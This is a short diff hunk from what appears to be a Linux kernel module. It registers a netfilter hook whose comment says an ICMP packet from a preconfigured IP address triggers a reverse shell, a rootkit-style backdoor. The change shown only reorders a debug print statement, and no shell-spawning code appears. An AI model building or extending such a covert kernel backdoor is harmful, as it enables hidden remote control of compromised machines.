@@ -346,8 +346,8 @@ unsigned int icmp_hook_func(void* priv, struct sk_buff* skb, const struct nf_hoo
 	// If it's an ICMP packet coming from the IP address entered during config,
 	// we should open a reverse shell.
 	if (ip_header->protocol == IPPROTO_ICMP) {
-		printk(KERN_EMERG "ICMP ping found!\n");
 		char source_ip[16];
+		printk(KERN_EMERG "ICMP ping found!\n");
 		printk(KERN_EMERG "%pI4", &ip_header->saddr);
 		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);
 
